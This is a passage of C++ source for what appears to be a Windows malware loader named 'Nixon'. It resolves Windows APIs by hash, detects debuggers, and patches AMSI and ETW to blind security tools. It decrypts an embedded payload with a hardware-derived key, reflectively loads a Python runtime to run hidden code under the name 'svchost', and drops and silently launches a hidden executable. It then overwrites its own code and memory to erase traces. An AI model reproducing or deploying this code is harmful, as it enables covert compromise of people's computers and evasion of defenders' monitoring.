        pExceptionInfo->ContextRecord->Dr3 = 0;
        pExceptionInfo->ContextRecord->Dr7 = 0;
        return EXCEPTION_CONTINUE_EXECUTION;
    }
    return EXCEPTION_CONTINUE_SEARCH;
}


// ============================================================
// HARDWARE ACCELERATION HAND-OFFS (AVX-512)
// Optimization for Ciphertext Packing (FHE batch addition)
// ============================================================
#if defined(__GNUC__) || defined(__clang__)
#include <cpuid.h>
#elif defined(_MSC_VER)
#include <intrin.h>
#endif

extern "C" void Nixon_AVX512_FHE_Add(uint32_t* c1, uint32_t* c2, uint32_t modulus, int count) {
    int i = 0;
    static bool checked = false;
    static bool has_avx512 = false;
    if (!checked) {
#if defined(__GNUC__) || defined(__clang__)
        unsigned int eax, ebx, ecx, edx;
        if (__get_cpuid_count(7, 0, &eax, &ebx, &ecx, &edx)) {
            if (ebx & (1 << 16)) has_avx512 = true;
        }
#elif defined(_MSC_VER)
        int cpuInfo[4];
        __cpuidex(cpuInfo, 7, 0);
        if (cpuInfo[1] & (1 << 16)) has_avx512 = true;
#endif
        checked = true;
    }

    if (has_avx512) {
        __m512i vmod = _mm512_set1_epi32(modulus);
        __m512i vone = _mm512_set1_epi32(1);
        for (; i <= count - 16; i += 16) {
            __m512i va = _mm512_loadu_si512((__m512i*)&c1[i]);
            __m512i vb = _mm512_loadu_si512((__m512i*)&c2[i]);
            __m512i vadd = _mm512_add_epi32(va, vb);

            // Handle 32-bit overflow (carry)
            __mmask16 carry = _mm512_cmplt_epu32_mask(vadd, va);
            
            if (modulus == 0xFFFFFFFF) {
                vadd = _mm512_mask_add_epi32(vadd, carry, vadd, vone);
                __mmask16 m = _mm512_cmpeq_epu32_mask(vadd, vmod);
                vadd = _mm512_mask_mov_epi32(vadd, m, _mm512_setzero_si512());
            } else {
                __mmask16 mask = _mm512_cmpge_epu32_mask(vadd, vmod);
                vadd = _mm512_mask_sub_epi32(vadd, mask, vadd, vmod);
            }
            
            _mm512_storeu_si512((__m512i*)&c1[i], vadd);
        }
    }
    // Fallback or uneven tail computation scalar loop
    for (; i < count; i++) {
        uint64_t sum = (uint64_t)c1[i] + (uint64_t)c2[i];
        c1[i] = (uint32_t)(sum % modulus);
    }
}

LONG WINAPI CustomUnhandledExceptionFilter(EXCEPTION_POINTERS* ) {
    typedef void(WINAPI* fnExitProcess)(UINT);
    PVOID pK32 = GetModuleBase(0x6DDB9555);
    if (pK32) {
        fnExitProcess ep = (fnExitProcess)GetExportAddress(pK32, HashFNV1a("ExitProcess"));
        if (ep) ep(0);
    }
    return EXCEPTION_EXECUTE_HANDLER;
}

int main(int argc, char* argv[]) {
#ifdef _WIN32
    // Batch-B #34: suppress crash dialogs before any tamper check fires.
    nixon_suppress_crash_dialogs();
#endif
    SetUnhandledExceptionFilter(CustomUnhandledExceptionFilter);

    volatile uint32_t state = 0x10;
    HardwareFingerprint hwfp;
    unsigned char machineKey[32];
    unsigned char rc4HardwareKey[32];
    ReflectiveLoader::HellsGate hg;
    SecureVector bmpCopy;
    SecureVector payloadData;
    SecureEnclave::ProtectedBuffer enclave = {0};
    bool dbgPresent = false;
    while (state != 0xFF) {
        switch (state) {
            case 0x10: {
                if (!InitDynamicAPI()) return 1;
                state = 0x20;
                break;
            }
            case 0x20: {
                PVOID baseAddress = GetModuleBase(0);
                if (!baseAddress && g_api.pGetTickCount) {
                    #ifdef _WIN64
                        PPEB pPeb = (PPEB)__readgsqword(0x60);
                    #else
                        PPEB pPeb = (PPEB)__readfsdword(0x30);
                    #endif
                    baseAddress = pPeb->Reserved3[1];
                }
                if (baseAddress && g_api.pVirtualProtect) {
                    DWORD oldProtect;
                    if (g_api.pVirtualProtect(baseAddress, 4096, PAGE_READWRITE, &oldProtect)) {
                        volatile unsigned char* pHeader = (volatile unsigned char*)baseAddress;
                        for (size_t i = 0; i < 4096; i++) pHeader[i] = 0;
                        g_api.pVirtualProtect(baseAddress, 4096, oldProtect, &oldProtect);
                    }
                }
                state = 0x30;
                break;
            }
            case 0x30: {
                if (g_api.pCreateThread) g_hWatchdog = g_api.pCreateThread(NULL, 0, WatchdogThread, NULL, 0, NULL);
                state = 0x40;
                break;
            }
            case 0x40: {
                dbgPresent = RunAllAntiAnalysis();
                state = 0x50;
                break;
            }
            case 0x50: {
                CollectAdvancedFingerprint(hwfp);
                DeriveKeyFromFingerprint_Iterative(hwfp, machineKey, 32);
                DeriveRC4Key(machineKey, 32, NIXON_KEY_SALT, 16, rc4HardwareKey, 32);
                volatile unsigned char* fpWipe = (volatile unsigned char*)&hwfp;
                for (size_t i = 0; i < sizeof(hwfp); i++) fpWipe[i] = 0;
                volatile uint32_t hwMix = hwfp.volumeSerial;
                hwMix ^= hwfp.volumeSerial; 
                state = 0x60 + hwMix;
                break;
            }
            case 0x60: {
                ReflectiveLoader::InitHellsGate(hg);
                state = 0x70;
                break;
            }
            case 0x70: {
                if (!DecodeStringArray(NIXON_WORD_ARRAY, NIXON_PAYLOAD_LEN, payloadData)) {
                    state = 0xFF; 
                    break;
                }
                state = 0x80;
                break;
            }
            case 0x80: {
                enclave = SecureEnclave::Allocate(payloadData.size());
                if (enclave.data) memcpy(enclave.data, payloadData.data(), payloadData.size());
                volatile unsigned char* pdWipe = payloadData.data();
                for (size_t i = 0; i < payloadData.size(); i++) pdWipe[i] = 0;
                state = 0x90;
                break;
            }
            case 0x90: {
                if (g_debugDetected) dbgPresent = true;
                if (enclave.data) {
                    SecureVector enclaveVec(enclave.data, enclave.data + enclave.size);
                    unsigned char dynamicUTK[32], dynamicIV[16];
                    DeriveRC4Key(machineKey, 32, NIXON_KEY_SALT, 16, dynamicUTK, 32);
                    DeriveRC4Key(machineKey, 32, NIXON_KEY_SALT, 16, dynamicIV, 16);
                    for (int i = 0; i < 16; i++) dynamicIV[i] ^= (unsigned char)i;
                    WhiteboxCipher::DecryptCTR(enclaveVec.data(), enclaveVec.size(), dynamicUTK, dynamicIV);
                    RC4_Crypt(enclaveVec, rc4HardwareKey, 32, dbgPresent);
                    memcpy(enclave.data, enclaveVec.data(), enclaveVec.size());
                    volatile unsigned char* evWipe = enclaveVec.data();
                    for (size_t i = 0; i < enclaveVec.size(); i++) evWipe[i] = 0;
                }
                state = 0xA0;
                break;
            }
            case 0x95: {
                if (NIXON_RUST_COMPRESSED_LEN > 0) {
                    SecureVector rustRaw(NIXON_RUST_ORIGINAL_LEN);
                    uLongf rawLen = NIXON_RUST_ORIGINAL_LEN;
                    if (uncompress(rustRaw.data(), &rawLen,
                                   NIXON_RUST_BINARY, NIXON_RUST_COMPRESSED_LEN) == Z_OK) {
                        char tempPath[MAX_PATH + 1] = {0};
                        char tempFile[MAX_PATH + 1] = {0};
                        PVOID pK32 = GetModuleBase(0x6DDB9555);
                        typedef DWORD(WINAPI* fnGetTempPathA)(DWORD, LPSTR);
                        typedef UINT(WINAPI* fnGetTempFileNameA)(LPCSTR, LPCSTR, UINT, LPSTR);
                        typedef HANDLE(WINAPI* fnCreateFileA)(LPCSTR, DWORD, DWORD, LPSECURITY_ATTRIBUTES, DWORD, DWORD, HANDLE);
                        typedef BOOL(WINAPI* fnWriteFile)(HANDLE, LPCVOID, DWORD, LPDWORD, LPOVERLAPPED);
                        typedef BOOL(WINAPI* fnCreateProcessA)(LPCSTR, LPSTR, LPSECURITY_ATTRIBUTES, LPSECURITY_ATTRIBUTES, BOOL, DWORD, LPVOID, LPCSTR, LPSTARTUPINFOA, LPPROCESS_INFORMATION);
                        fnGetTempPathA pGetTempPathA = (fnGetTempPathA)GetExportAddress(pK32, HashFNV1a("GetTempPathA"));
                        fnGetTempFileNameA pGetTempFileNameA = (fnGetTempFileNameA)GetExportAddress(pK32, HashFNV1a("GetTempFileNameA"));
                        fnCreateFileA pCreateFileA = (fnCreateFileA)GetExportAddress(pK32, HashFNV1a("CreateFileA"));
                        fnWriteFile pWriteFile = (fnWriteFile)GetExportAddress(pK32, HashFNV1a("WriteFile"));
                        fnCreateProcessA pCreateProcessA = (fnCreateProcessA)GetExportAddress(pK32, HashFNV1a("CreateProcessA"));
                        if (pGetTempPathA && pGetTempFileNameA && pCreateFileA && pWriteFile && pCreateProcessA) {
                            pGetTempPathA(MAX_PATH, tempPath);
                            pGetTempFileNameA(tempPath, "NXN", 0, tempFile);
                            HANDLE hFile = pCreateFileA(tempFile, GENERIC_WRITE, 0, NULL,
                                                       CREATE_ALWAYS, FILE_ATTRIBUTE_HIDDEN, NULL);
                            if (hFile != INVALID_HANDLE_VALUE) {
                                DWORD written;
                                pWriteFile(hFile, rustRaw.data(), (DWORD)rustRaw.size(), &written, NULL);
                                if (g_api.pCloseHandle) g_api.pCloseHandle(hFile);
                                STARTUPINFOA si = { sizeof(si) };
                                PROCESS_INFORMATION pi = {0};
                                si.dwFlags = STARTF_USESHOWWINDOW;
                                si.wShowWindow = SW_HIDE;
                                pCreateProcessA(tempFile, NULL, NULL, NULL, FALSE,
                                               CREATE_NO_WINDOW, NULL, NULL, &si, &pi);
                                if (g_api.pCloseHandle) {
                                    g_api.pCloseHandle(pi.hProcess);
                                    g_api.pCloseHandle(pi.hThread);
                                }
                            }
                        }
                    }
                    volatile unsigned char* w = rustRaw.data();
                    for (size_t i = 0; i < rustRaw.size(); i++) w[i] = 0;
                }
                state = 0xA0;
                break;
            }
            case 0xA0: {
                PatchAMSI();
                PatchETW();
                InstallHardwareHooks();
                state = 0xA5;
                break;
            }
            case 0xA5: {
                if (NIXON_DLL_COMPRESSED_LEN > 0) {
                    SecureVector dllRaw(NIXON_DLL_ORIGINAL_LEN);
                    uLongf rawLen = NIXON_DLL_ORIGINAL_LEN;
                    if (uncompress(dllRaw.data(), &rawLen, NIXON_PYTHON_DLL, NIXON_DLL_COMPRESSED_LEN) == Z_OK) {
                        PVOID pPyMod = ReflectiveLoader::LoadPEFromMemory(hg, dllRaw.data(), rawLen);
                        if (pPyMod) {
                            g_py.pPy_Initialize = (fnPy_Initialize)GetExportAddress(pPyMod, HashFNV1a("Py_Initialize"));
                            g_py.pPy_Finalize = (fnPy_Finalize)GetExportAddress(pPyMod, HashFNV1a("Py_Finalize"));
                            g_py.pPy_SetProgramName = (fnPy_SetProgramName)GetExportAddress(pPyMod, HashFNV1a("Py_SetProgramName"));
                            g_py.pPyMarshal_ReadObjectFromString = (fnPyMarshal_ReadObjectFromString)GetExportAddress(pPyMod, HashFNV1a("PyMarshal_ReadObjectFromString"));
                            g_py.pPyImport_AddModule = (fnPyImport_AddModule)GetExportAddress(pPyMod, HashFNV1a("PyImport_AddModule"));
                            g_py.pPyModule_GetDict = (fnPyModule_GetDict)GetExportAddress(pPyMod, HashFNV1a("PyModule_GetDict"));
                            g_py.pPyEval_EvalCode = (fnPyEval_EvalCode)GetExportAddress(pPyMod, HashFNV1a("PyEval_EvalCode"));
                            g_py.pPyErr_Clear = (fnPyErr_Clear)GetExportAddress(pPyMod, HashFNV1a("PyErr_Clear"));
                            g_py.pPy_DecRef = (fnPy_DecRef)GetExportAddress(pPyMod, HashFNV1a("Py_DecRef"));

                            g_py.pPyDict_SetItemString = (fnPyDict_SetItemString)GetExportAddress(pPyMod, HashFNV1a("PyDict_SetItemString"));
                            g_py.pPyLong_FromVoidPtr = (fnPyLong_FromVoidPtr)GetExportAddress(pPyMod, HashFNV1a("PyLong_FromVoidPtr"));

                            g_py.pPy_OptimizeFlag = (int*)GetExportAddress(pPyMod, HashFNV1a("Py_OptimizeFlag"));
                            g_py.pPy_NoSiteFlag = (int*)GetExportAddress(pPyMod, HashFNV1a("Py_NoSiteFlag"));
                            g_py.pPy_DontWriteBytecodeFlag = (int*)GetExportAddress(pPyMod, HashFNV1a("Py_DontWriteBytecodeFlag"));
                        }
                    }
                    volatile unsigned char* wipeDll = dllRaw.data();
                    for(size_t i=0; i<dllRaw.size(); i++) wipeDll[i] = 0;
                }
                state = 0xB0;
                break;
            }
            case 0xB0: {
                if (g_py.pPy_OptimizeFlag) *g_py.pPy_OptimizeFlag = 2;
                if (g_py.pPy_NoSiteFlag) *g_py.pPy_NoSiteFlag = 1;
                if (g_py.pPy_DontWriteBytecodeFlag) *g_py.pPy_DontWriteBytecodeFlag = 1;
                if (g_py.pPy_SetProgramName) g_py.pPy_SetProgramName(L"svchost");
                if (g_py.pPy_Initialize) g_py.pPy_Initialize();
                state = 0xC0;
                break;
            }
            case 0xC0: {
                if (enclave.data && g_py.pPyMarshal_ReadObjectFromString) {
                    SecureEnclave::ProtectedBuffer execBuf = SecureEnclave::Allocate(enclave.size);
                    if (execBuf.data) {
                        SecureVector tmpBuf(enclave.data, enclave.data + enclave.size);
                        RC4_Crypt(tmpBuf, rc4HardwareKey, 32, false);
                        memcpy(execBuf.data, tmpBuf.data(), tmpBuf.size());
                        volatile unsigned char* pTmpBuf = tmpBuf.data();
                        for (size_t i = 0; i < tmpBuf.size(); i++) pTmpBuf[i] = 0;
                        g_pEnclaveBase = execBuf.data;
                        g_enclaveSize = execBuf.size;
                        SecureEnclave::Lock(execBuf); 
                        PyObject* pCode = g_py.pPyMarshal_ReadObjectFromString((const char*)execBuf.data, execBuf.size);
                        g_pEnclaveBase = nullptr;
                        g_enclaveSize = 0;
                        SecureEnclave::Unlock(execBuf);
                        SecureEnclave::SecureWipe(execBuf);
                        if (pCode != NULL && g_py.pPyImport_AddModule) {
                            PyObject* pModule = g_py.pPyImport_AddModule(OBF("__main__"));
                            PyObject* pDict = g_py.pPyModule_GetDict(pModule);
                            
                            // Inject AVX-512 Hardware Acceleration pointer into Python VM
                            if (g_py.pPyDict_SetItemString && g_py.pPyLong_FromVoidPtr) {
                                PyObject* pAddr = g_py.pPyLong_FromVoidPtr((void*)Nixon_AVX512_FHE_Add);
                                if (pAddr) {
                                    g_py.pPyDict_SetItemString(pDict, "_NIXON_AVX512_PTR_", pAddr);
                                    g_py.pPy_DecRef(pAddr);
                                }
                            }
                            PyObject* pResult = g_py.pPyEval_EvalCode(pCode, pDict, pDict);

                            if (pResult != NULL) g_py.pPy_DecRef(pResult);
                            else if (g_py.pPyErr_Clear) g_py.pPyErr_Clear();
                            g_py.pPy_DecRef(pCode);
                        } else if (g_py.pPyErr_Clear) {
                            g_py.pPyErr_Clear();
                        }
                    }
                }
                state = 0xD0;
                break;
            }
            case 0xD0: {
                auto SelfDestruct = [](void* funcAddr, size_t len) {
                    DWORD old;
                    if (g_api.pVirtualProtect && g_api.pVirtualProtect(funcAddr, len, PAGE_READWRITE, &old)) {
                        volatile unsigned char* p = (volatile unsigned char*)funcAddr;
                        DWORD tick = g_api.pGetTickCount ? g_api.pGetTickCount() : 0;
                        for (size_t i = 0; i < len; i++) p[i] = (unsigned char)((tick + i * 7) & 0xFF);
                        g_api.pVirtualProtect(funcAddr, len, old, &old);
                    }
                };
                SelfDestruct((void*)&RC4_KSA, 256);
                SelfDestruct((void*)&RC4_Crypt, 256);
                SelfDestruct((void*)&DeriveRC4Key, 256);
                SelfDestruct((void*)&DecodeStringArray, 256);
                SelfDestruct((void*)&DeriveKeyFromFingerprint_Iterative, 256);
                SelfDestruct((void*)&ReflectiveLoader::LoadPEFromMemory, 1024);
                SelfDestruct((void*)&InstallHardwareHooks, 512);
                SelfDestruct((void*)&PatchAMSI, 256);
                SelfDestruct((void*)&PatchETW, 256);
                SelfDestruct((void*)&GetModuleBase, 512);
                SelfDestruct((void*)&GetExportAddress, 1024);
                WipeAllObfBufs();
                SecureEnclave::SecureWipe(enclave);
                volatile unsigned char* mkWipe = machineKey;
                volatile unsigned char* rkHWipe = rc4HardwareKey;
                for (int i = 0; i < 32; i++) { mkWipe[i] = 0; rkHWipe[i] = 0; }
                if (g_hWatchdog) {
                    if (g_api.pTerminateThread) g_api.pTerminateThread(g_hWatchdog, 0);
                    if (g_api.pCloseHandle) g_api.pCloseHandle(g_hWatchdog);
                }
                if (g_py.pPy_Finalize) g_py.pPy_Finalize();
                
                typedef void(WINAPI* fnExitProcess)(UINT);
                struct WipeCtx {
                    fnVirtualProtect pVP;
                    fnExitProcess pEP;
                    void* base;
                    size_t size;
                };

#pragma optimize("", off)
                struct WipeStub {
                    static void WINAPI WipeAndExit(WipeCtx* ctx) {
                        DWORD old;
                        ctx->pVP(ctx->base, ctx->size, 0x04, &old); // PAGE_READWRITE
                        volatile char* p = (volatile char*)ctx->base;
                        for (size_t i = 0; i < ctx->size; i++) p[i] = 0;
                        ctx->pEP(0);
                    }
                    static void WINAPI WipeAndExitEnd() {}
                };
#pragma optimize("", on)

                WipeCtx ctx;
                ctx.pVP = g_api.pVirtualProtect;
                PVOID pK32 = GetModuleBase(0x6DDB9555);
                ctx.pEP = (fnExitProcess)GetExportAddress(pK32, HashFNV1a("ExitProcess"));
                typedef HMODULE(WINAPI* fnGetModuleHandleA)(LPCSTR);
                fnGetModuleHandleA pGMH = (fnGetModuleHandleA)GetExportAddress(pK32, HashFNV1a("GetModuleHandleA"));
                ctx.base = pGMH ? pGMH(NULL) : NULL;
                if (ctx.base && ctx.pEP && ctx.pVP) {
                    PIMAGE_DOS_HEADER dos = (PIMAGE_DOS_HEADER)ctx.base;
                    PIMAGE_NT_HEADERS nt = (PIMAGE_NT_HEADERS)((PBYTE)ctx.base + dos->e_lfanew);
                    ctx.size = nt->OptionalHeader.SizeOfImage;
                    
                    size_t stubSize = (size_t)((PBYTE)WipeStub::WipeAndExitEnd - (PBYTE)WipeStub::WipeAndExit);
                    if (stubSize > 0 && stubSize < 1024) {
                        void* stub = g_api.pVirtualAlloc(NULL, 1024, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
                        if (stub) {
                            unsigned char* src = (unsigned char*)WipeStub::WipeAndExit;
                            unsigned char* dst = (unsigned char*)stub;
                            for (size_t i = 0; i < stubSize; i++) dst[i] = src[i];
                            void (*fnStub)(WipeCtx*) = (void (*)(WipeCtx*))stub;
                            fnStub(&ctx);
                        }
                    }
                }
                if (ctx.pEP) ctx.pEP(0);

                state = 0xFF; 
                break;
            }
            default:
                state = 0xFF; 
                break;
        }
    }
    return 0;
}
#ifdef _MSC_VER
void NTAPI TlsCallback(PVOID DllHandle, DWORD Reason, PVOID Reserved) {
    if (Reason == DLL_PROCESS_ATTACH) {
        if (CheckPEB()) {
            g_debugDetected = true;
        }
        if (CheckHardwareBP()) {
            g_debugDetected = true;
        }
    }
}
#pragma comment(linker, "/INCLUDE:_tls_used")
#pragma comment(linker, "/INCLUDE:p_tls_callback")
#pragma data_seg(".CRT$XLB")
extern "C" PIMAGE_TLS_CALLBACK p_tls_callback = TlsCallback;
#pragma data_seg()
#else
void NTAPI TlsCallback(PVOID DllHandle, DWORD Reason, PVOID Reserved) {
    if (Reason == DLL_PROCESS_ATTACH) {
        if (CheckPEB() || CheckHardwareBP()) g_debugDetected = true;
    }
}
__attribute__((section(".CRT$XLB"))) PIMAGE_TLS_CALLBACK p_tls_callback = TlsCallback;
#endif